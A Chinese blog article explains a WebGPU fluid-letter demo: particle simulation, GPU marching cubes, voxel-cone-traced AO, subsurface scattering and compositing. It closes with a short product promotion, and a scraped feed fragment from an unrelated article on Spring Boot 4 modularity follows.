<p>需要先讲清楚：本文的 Demo <strong>并不适合生产</strong>。在 M3 Max 这类比较强的 MacBook Pro 上它可能能跑到 120fps；M1 Pro 上大概 60fps；其它不错的机器也许 50fps……但如果你拿去跑在 MacBook Air 上，“浏览器流体梦”会很快破碎。</p>
<p>那它为什么仍然有价值？</p>
<p>因为它其实是一组可拆解的技术集合。你可能对其中某个部分感兴趣：粒子动画、从势场生成表面（避免 ray marching）、间接光、世界空间 AO……你可以把仓库里的代码拿出来，只取你需要的部分来构建自己的想法。</p>
<p>这个 Demo 大致可以拆成 4 个主要阶段：</p>
<ul>
<li><strong>流体模拟</strong>：用粒子模拟（基于 Position Based Dynamics 思路）驱动流体的运动。</li>
<li><strong>几何生成</strong>：用 GPU 上的 marching cubes，从粒子生成渲染用三角形。</li>
<li><strong>几何渲染</strong>：使用距离场估算几何厚度以做次表面散射（SSS），并用体素锥追踪（Voxel Cone Tracing）计算 AO。</li>
<li><strong>合成</strong>：地面反射模糊、调色与 Bloom 等后期。</li>
</ul>
<h2 data-id="heading-4">流体模拟</h2>
<p>很多年前，如果你想在图形圈子里“显得很酷”，你得证明你能自己做流体模拟：做 2D 就很强，做 3D 就是“封神”（当然这是我脑内的中二设定）。为了“封神”（也为了赢赌局），我开始疯狂读 3D 模拟相关的资料。</p>
<p>做流体的方法很多，其中一种叫 <strong>SPH</strong>。理性做法应该是先评估哪个方法更适合 Web，但我当时选它就因为名字听起来很酷。SPH 是粒子法，这一点长期来看很有好处，因为后来我把 SPH 换成了 position based 的方法。</p>
<p>如果你做过“群体行为（steering behaviors）”或 flocking，会更容易理解 SPH。</p>
<p>Three.js 有很多 flocking 示例，它基于吸引、对齐、排斥等 steering 行为。用不同的权重/函数，根据粒子之间的距离决定粒子受哪些行为影响。</p>
<p>SPH 的做法也有点类似：你先算每个粒子的密度，再用密度算压力；压力就像 flocking 里的吸引/排斥，使粒子靠近或远离。密度又是邻域粒子距离的函数，所以压力本质上也是“由距离间接决定的”。</p>
<p>SPH 的粘性项（viscosity）也类似 flocking 的对齐项（alignment）：让粒子速度趋向邻域的平均速度场。</p>
<p>为了（过度）简化，你可以把 SPH 理解成：给 flocking 套上一组更“物理正确”的参数，让粒子更像流体。当然 SPH 还会涉及表面张力等更多步骤，且其核函数/权重远比这里描述复杂，但如果你能把 flocking 做好，理解 SPH 会更轻松。</p>
<p>SPH/群体行为都有一个共同难点：朴素实现是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>，粒子多就会爆炸。你需要一个加速结构只查询附近粒子，让复杂度从 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 降到 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mo>⋅</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k\cdot n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span>（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 是每个粒子要检查的邻居数）。常见做法是体素网格：每个体素格子存最多 4 个粒子索引。</p>
<p>在这个示例里，算法会检查粒子周围 27 个体素，每个体素最多 4 个粒子，所以最多 108 次邻域检查。听起来也不少，但比检查 8 万个粒子要好太多。</p>
<p>但邻域遍历仍然昂贵。SPH 还要求多次 pass：密度、压力/位移、粘性、表面张力……当你意识到 GPU 绝大部分算力都在“驱动粒子”时，性能就会变得非常重要。</p>
<p>而且 SPH 很难调参，你得理解很多工程/物理参数才能做得好看。</p>
<p>后来 NVidia 提出了一套粒子动力学方法：<strong>Position Based Dynamics（PBD）</strong>，其中包含刚体、软体、流体、碰撞等。<a href="https://link.juejin.cn?target=https%3A%2F%2Fmmacklin.com%2F2017-EG-CourseNotes.pdf" target="_blank" title="https://mmacklin.com/2017-EG-CourseNotes.pdf" ref="nofollow noopener noreferrer">课程笔记在这里</a>。</p>
<p>PBD 通过“约束（constraints）”直接修正粒子位置，结果稳定、调参相对容易。这让我从 SPH 转向 <strong>PBF（Position Based Fluids）</strong>。核心差别在于：PBF 用约束来定义位移，而不是像 SPH 那样先算密度。</p>
<p>PBF 的参数更“无量纲”，更好理解。</p>
<p>但它也有代价：PBD 往往要迭代多次才能得到更好结果（计算约束、应用位移、计算粘性……反复执行），稳定但更慢。</p>
<p>而我不想只渲染粒子，我要渲染网格：GPU 还要算三角形、做渲染。我没有足够预算做多轮迭代，所以我必须“砍角”。</p>
<p>幸运的是，PBD 有一种很便宜的碰撞计算方式：在施加力（forces）后做一次 pass 即可。我选择：</p>
<ul>
<li>用重力作为主力；</li>
<li>用 curl noise 作为辅助力，增加流体感；</li>
<li>用鼠标驱动一个很强的斥力（repulsion）；</li>
<li>让碰撞负责避免粒子聚成奇怪的团。</li>
</ul>
<p>curl + 重力提供“像流体”的整体趋势，碰撞避免粒子聚团。它不如 PBF 那么真实，但更快。</p>
<p>实现上只需要一次 pass 应用所有力，同时在 storage buffer 里生成网格加速结构；atomics 写索引只需要几行代码。你可以在仓库的 <code>PBF_applyForces.wgsl</code> 里读到力与网格构建的实现。</p>
<p>粒子位置更新在 <code>PBF_calculateDisplacements.wgsl</code>：负责遍历邻域做碰撞，也负责和环境（不可见包围盒）碰撞。</p>
<p>pipeline 与绑定在 <code>PBF.js</code>：模拟只用三个 shader——施力、位移更新、速度积分。位置更新后，速度通过“新位置 - 旧位置”的差值得到。</p>
<p>最后一个 shader <code>PBF_integrateVelocity.wgsl</code> 还会设置一个包含粒子信息的 3D 纹理，后续会用于 marching cubes 生成势场。</p>
<h2 data-id="heading-5">Marching Cubes（几何生成）</h2>
<p>当年我第一次用 SPH 把粒子跑起来时兴奋得不行，在办公室到处吹（基本到处都是）。Felix 当然知道怎么治我：他把我赶回去继续做“表面生成”，因为只有把流体渲染成液体表面而不是点，才算“像样”。</p>
<p>从粒子场渲染表面常见有三种思路：</p>
<ul>
<li>Point Splatting</li>
<li>Raymarching</li>
<li>Marching Cubes</li>
</ul>
<p>Point splatting 是最简单也最快的一种：屏幕空间效果，渲染粒子后结合可分离模糊与深度来生成法线。效果很不错，还能做焦散，实时性能也好。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52e2d6af1d614b8984c5ae358dd1e3fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=%2BFv1qWiKe3RdlTzFlMsdeN1aWKc%3D" alt="image.png" loading="lazy"/></p>
<p>Raymarching 很有趣，能做多次反射折射等复杂效果，但非常慢：你需要从粒子生成距离场，再在距离场里做步进采样（过去还没有 3D 纹理，只能软插值）。即使硬件支持三线性插值，性能也依然不太理想。画面很美，但不适合实时。</p>
<p>Marching cubes 听起来很吸引人：从粒子生成的势场（potential field）里提取等值面生成网格。优点是网格可直接栅格化，在高分辨率下也能稳定渲染；并且有了网格，很多“反射”就能更便宜地实现。与前两种方案相比，它更容易作为世界空间几何体融入场景。</p>
<p>Three.js 有 marching cubes 的例子，但那些是 CPU 上生成表面；而我的粒子数据在 GPU。我去读 Matt Swoboda 的分享，了解他如何在 GPU 上做 marching cubes，但里面有很多我当时还不懂的问题：</p>
<ul>
<li>如何从粒子场生成势场？</li>
<li>间接 dispatch 是怎么回事？</li>
<li>如何在 GPU 上生成三角形？</li>
</ul>
<p>先把路线图讲清楚。Marching cubes 本质是从势场提取等值面（iso-surface）。关键步骤有：</p>
<ol>
<li>从粒子生成势场（potential）。</li>
<li>在体素网格上评估势值，决定每个体素对应 256 种“case”里哪一种（每个体素会生成 0 到 5 个三角形）。</li>
<li>GPU 上把满足条件的体素写入连续 buffer（用 atomics 追加）。</li>
<li>根据体素信息生成三角形。</li>
</ol>
<h3 data-id="heading-6">势场生成（Potential Generation）</h3>
<p>如果你了解 point splatting，会发现“模糊”很关键：它能把点云平滑成近似表面。同样思路也适用于 3D 纹理：对 3D 纹理做 blur，就能得到一种“穷人版距离场”。</p>
<p>你也可以用 Jump Flood 算法生成更精确的距离场（粒子也可以），看起来还可能比 3D blur 更快——但它有个致命缺点：它<strong>太精确</strong>了。</p>
<p>Jump Flood 的结果更像是一组球体的距离场，等值面阈值不同会把球“连起来”，但不会以一种“好看”的方式平滑。你得有非常多的粒子才会像连续表面，而那种情况下你倒不如直接用 point splatting。</p>
<p>3D blur 反而会把粒子“抹开”，去掉高频的颗粒感，让它更像表面。blur 次数越多，表面越平滑；你也能尝试不同 blur 方式混合出不同的表面效果。奇妙的是：这个简单办法在这里反而更快、更实用。</p>
<p>实现上，blur 用 compute shader <code>Blur3D.wgsl</code>，沿三个轴各 dispatch 一次；绑定与 dispatch 在 <code>Blur3D.js</code>。</p>
<h3 data-id="heading-7">体素筛选（Checking voxels）</h3>
<p>势场生成后，我用另一个 compute shader 扫描体素网格，找出会生成三角形的体素。仓库里的 <code>MarchCase.wgsl</code> 会遍历整个体素网格，为需要生成三角形的体素计算 marching cubes case，并用 atomics 把该体素的 3D 坐标与 case 连续写入 storage buffer。</p>
<p>然后 <code>EncodeBuffer.wgsl</code> 读取上一步得到的体素数量，编码出用于“间接 dispatch”的参数（三角形生成需要多少顶点）以及“间接 draw”的参数（需要绘制多少三角形）。</p>
<h3 data-id="heading-8">三角形生成（Triangles Generation）</h3>
<p>负责生成顶点/法线的 shader 是 <code>GenerateTriangles.wgsl</code>。它根据每个线程的全局索引定位到对应体素和要生成的顶点，并通过 <code>EncodeBuffer.wgsl</code> 产生的间接 dispatch 来运行。</p>
<p>体素信息用于在边的两个角点之间做线性插值，得到顶点位置；法线则来自边两端角点梯度（gradient）的线性插值。</p>
<p>势场生成、体素收集、三角形生成这些步骤在 <code>TrianglesGenerator.js</code> 的 <code>generateTriangles</code> 函数里串起来，每次粒子位置更新后都会调用。</p>
<h2 data-id="heading-9">渲染</h2>
<p>这些年我最大的错误之一，是把“模拟/GPGPU 技术”看得比“视觉美感”更重要。我太执着于证明自己能做复杂东西，而忽略了最终画面。</p>
<p>Felix 经常在我准备发布 Demo 之前拦住我：花更多时间把画面打磨得更舒服，别只做成那种“只有四个人会觉得很酷”的技术展示。</p>
<p>相信我：你可以做很强的物理模拟、很复杂的材质——但如果看起来很糟糕，那它就是糟糕。</p>
<p>流体的难点在于：你已经把大量 GPU 时间花在粒子动力学和表面生成上了，留给渲染效果的预算不多；还要给场景里其它东西留时间。所以实时流体一般很难做到“极致画质”。</p>
<p>实时渲染液体的最优解通常是 point splatting：反射、折射、阴影、焦散都能做，而且很“便宜”。不信可以看看这个很棒的 Demo：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwebgpu-ocean.netlify.app%2F" target="_blank" title="https://webgpu-ocean.netlify.app/" ref="nofollow noopener noreferrer">webgpu-ocean.netlify.app/</a></p>
<p>如果你要的是不透明/半透明但不需要“真正透明”的液体（比如颜料），marching cubes 是不错选择：你可以用 PBR 得到很好看的视觉，而且它是世界空间几何，和场景整合更简单。</p>
<p>在这个 Demo 的范围里，我想利用现成的体素结构（用于三角形生成）以及用于生成三角形的势场（可视作距离场），做一些“相对便宜但有效”的视觉提升。</p>
<p>我先做了基于体素锥追踪（Voxel Cone Tracing，VCT）的 AO。VCT 通常要求先把三角形体素化，但这个 Demo 反过来：我们本来就是从体素生成三角形。所以 VCT 所需的一大块工作已经在流程里。</p>
<p>我只需要稍微改一下 <code>MarchCase.wgsl</code>：用离散化方式更新体素网格——有三角形的体素标记为 1，没有的标记为 0；同时把地面以下一定高度的体素标 0.5 来模拟地面 AO。只多加两行代码就能准备好 VCT 的信息。</p>
<p>体素网格更新后，再对 3D 纹理做 mipmap（<code>MipMapCompute.wgsl</code>，绑定在 <code>CalculateMipMap.js</code>）。</p>
<p>你会注意到我也做了地面反射：marching cubes 生成的是网格，做反射很直接——算反射矩阵，把网格绘制两遍即可。若用 ray marching 做同样效果会贵很多。</p>
<p>这时我还有一点 GPU 预算，于是继续问朋友：还有什么特性值得加？有人建议做次表面散射（Subsurface Scattering，SSS），像下面这种效果。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0a005defdf94b9ab69c2e9e5833a86f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=OEuS3dZvmPaJIRKMCpYZJri4eCo%3D" alt="image.png" loading="lazy"/></p>
<p>SSS 做得好非常加分，难点在于要知道几何体的厚度（thickness），才能决定光在内部散射的程度。</p>
<p>很多 SSS demo 用“厚度贴图”，但流体表面无法烘焙厚度，必须实时计算。</p>
<p>幸运的是，我们在生成三角形之前已经有势场，它可以当距离场用来实时估算表面厚度。概念上类似 Iñigo Quilez 做 AO 的方式：在距离场里 ray marching，看表面距离如何影响遮蔽。</p>
<p>我采用类似思路，但把光线沿“进入几何内部”的方向发射，从而估算内部光传播被遮挡的程度——厚的地方散射弱，薄的地方散射强。效果出乎意料地好。</p>
<p>几何材质在 <code>RenderMC.wgsl</code>：顶点着色器使用存储在 storage buffer 的顶点位置与法线。因为 CPU 不知道 marching cubes 实际生成了多少三角形，所以用 <code>EncodeBuffer.wgsl</code> 编码出的间接 draw 来绘制。</p>
<p>绑定里我用了两套矩阵：一套用于正常视角，另一套用于反射网格；这些在 <code>Main.js</code> 完成。</p>
<p>到这一步，模拟、表面生成、材质都有了，接下来该谈合成（composition）。</p>
<h2 data-id="heading-10">合成（Composition）</h2>
<p>你可能觉得自己是很厉害的图形开发者：会用 Three.js / Babylon.js / PlayCanvas 做酷炫效果……也可能你更强，很多东西自己写。</p>
<p>我想说的是：我不是。</p>
<p>我为什么知道？</p>
<p>因为我曾在 Active Theory（<a href="https://link.juejin.cn?target=https%3A%2F%2Factivetheory.net%2F" target="_blank" title="https://activetheory.net/" ref="nofollow noopener noreferrer">activetheory.net/</a>）工作，身边是非常优秀的图形开发和 3D 艺术家。他们让我看清自己的短板，也帮助我把交付物推到更好的状态。</p>
<p>如果你能争取和他们共事，对你的职业发展非常有帮助——你会学到很多。</p>
<p>其中最关键的一点是：<strong>合成决定一切。</strong></p>
<p>我请曾在 Active Theory 共事的 Paul-guilhem Repaux（<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Farpeegee" target="_blank" title="https://x.com/arpeegee" ref="nofollow noopener noreferrer">x.com/arpeegee</a>）帮我做合成建议。他指出了几个关键问题：</p>
<ul>
<li>地面反射过于清晰，应该更粗糙（更模糊）。</li>
<li>黑色背景无法体现光从哪里来；背景应该营造更“有情绪”的氛围。</li>
<li>缺少把几何体与环境融合的光效。</li>
<li>字母之间的过渡缺乏合理性。</li>
<li>需要调色。</li>
</ul>
<p>（当然还有很多能改的地方，他只是很友好地挑了最关键的。）</p>
<h3 data-id="heading-11">反射</h3>
<p>第一点可以用后期解决：根据几何体到地面的距离决定反射的模糊程度——离地越远越模糊，从而得到“粗糙度”效果。</p>
<p>但如果只在“有几何体高度信息”的区域模糊，周围空白区域会不模糊，结果会很怪。</p>
<p>为了解决这个问题，我先做了一个预处理 pass：把反射几何体做一个偏移，并把“最近的高度”写入一张纹理，用来在空白区域也决定模糊强度。</p>
<p>深红色是未反射几何体，绿色是反射几何体（包含偏移），你会看到绿色更“厚”。高度编码在红色通道里，可视为从地面到上方的渐变。</p>
<h3 data-id="heading-12">背景与光</h3>
<p>SSS 的实现假设光源始终从几何体背后打过来——即便镜头移动，这个方向也得成立，否则 SSS 不明显。</p>
<p>这对背景设计反而是好事：背景可以做一个“背光渐变”，自然地解释光来自背后；同时背景色也可以和材质更接近，让整体更融合。</p>
<h3 data-id="heading-13">光效融合</h3>
<p>最后，为了让背景与几何体的光融合得更好，我加了 Bloom：在几何体更薄的区域，Bloom 更强，从而强化 SSS 的视觉。</p>
<p>（顺带一提：我还尝试过把字母动画和 Codrops 的 Logo 对齐，但看起来像儿童识字应用，于是放弃。）</p>
<h3 data-id="heading-14">调色与氛围</h3>
<p>最后我加了亮度、对比度、gamma 校正，选择偏暖的配色让氛围更柔和。后期由多个 compute shader 完成，在 <code>Main.js</code> 里调用。</p>
<p>完整代码库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHectorArellanoDev%2FCodrops" target="_blank" title="https://github.com/HectorArellanoDev/Codrops" ref="nofollow noopener noreferrer">github.com/HectorArell…</a></p>
<p>简化版仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHectorArellanoDev%2FCodropsBasic" target="_blank" title="https://github.com/HectorArellanoDev/CodropsBasic" ref="nofollow noopener noreferrer">github.com/HectorArell…</a></p>
<p>你可以通过在 Demo URL 末尾加 <code>/?word=something</code> 来更改展示的单词。</p>
<h2 data-id="heading-15">结语</h2>
<p>本文没有深入性能优化，我觉得也没必要：这个 Demo 本来就面向强 GPU，不是移动端。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3331a9a8c18049729abbc850de008876~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=EMqTEmzlQVMjfUx%2FbmPohsc26hU%3D" alt="image.png" loading="lazy"/></p>
<p>WebGPU 的 timestamp query 让定位瓶颈变得更容易（例如 <code>Blur3D.js</code> 里就有注释掉的查询）。</p>
<p>这并不意味着“这套方案能直接上生产”。Felix 做过一个用 SPH 做字母的探索，非常快也很酷，你可以看看：<a href="https://link.juejin.cn?target=https%3A%2F%2Ffluid.felixmartinez.dev%2F" target="_blank" title="https://fluid.felixmartinez.dev/" ref="nofollow noopener noreferrer">fluid.felixmartinez.dev/</a></p>
<p>总之，这么多年过去，Felix 还是赢着赌局，而我还在努力扭转结果……希望你也能遇到一个让你说出 <em>“hold my beer”</em> 的人。</p>
<h2 data-id="heading-16">小结</h2>
<p>WebGPU 流体长文真正有价值的点在于：它把“酷炫 Demo”拆成了可复用的工程模块链路——粒子模拟、势场生成、marching cubes、间接 dispatch/draw、再到合成与调色。落地时最容易卡住的往往是性能预算与调参成本：算力都花在模拟与几何生成上，留给画面打磨的空间很小，所以工程上需要把可控的阶段拆开验证、逐步迭代。实践中可以用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">RollCode 低代码平台</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">私有化部署</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">自定义组件</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dfrontendweekly" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=frontendweekly" ref="nofollow noopener noreferrer">静态页面发布（SSG + SEO）</a> 来把 Demo 展示、参数面板、素材与发布流程做成可复现的交付闭环。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 4 新特性：模块化架构]]></title>    <link>https://juejin.cn/post/7602531501457129481</link>    <guid>https://juejin.cn/post/7602531501457129481</guid>    <pubDate>2026-02-04T06:29:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602531501457129481" data-draft-id="7602544700475736074" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 4 新特性：模块化架构"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-04T06:29:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 4 新特性：模块化架构
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T06:29:00.000Z" title="Wed Feb 04 2026 06:29:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    35
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2014 年，Spring Boot 1.0 横空出世，凭借“开箱即用”的理念彻底改变了 Java 开发方式。</p>
<p>当时，它的核心自动配置包 <code>spring-boot-autoconfigure</code> 仅 182 KB。</p>
<p>但到了 Spring Boot 3.5，这个包已经膨胀至 2 MB，支持的功能越来越多，但复杂度和体积也随之增长。</p>
